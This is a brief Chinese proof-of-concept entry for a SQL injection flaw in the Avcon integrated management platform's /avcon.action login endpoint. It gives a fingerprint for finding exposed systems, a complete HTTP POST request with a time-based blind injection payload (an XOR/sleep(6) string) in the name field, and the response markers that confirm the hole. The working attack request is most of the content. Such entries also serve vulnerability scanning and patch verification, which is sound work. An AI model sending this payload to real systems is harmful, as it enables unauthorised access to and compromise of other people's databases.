﻿# Avcon综合管理平台SQL注入漏洞

> 更新时间：2023-12-07

> 漏洞编号：

> 漏洞说明：Avcon综合管理平台 avcon接口name参数存在sql注入，可拼接执行延迟语句。

> 漏洞特征：title="AVCON-系统管理平台" || "/avcon.action"

> 验证脚本：HTTP

```
POST /avcon.action HTTP/1.1
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br

name=0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z&password=u]H[ww6KrA9F.x-F
```

> 响应代码特征：200

> 响应内容特征：登录失败

> 上传文件定位：

> 验证文件来源：Avcon综合管理平台SQL注入漏洞.poc
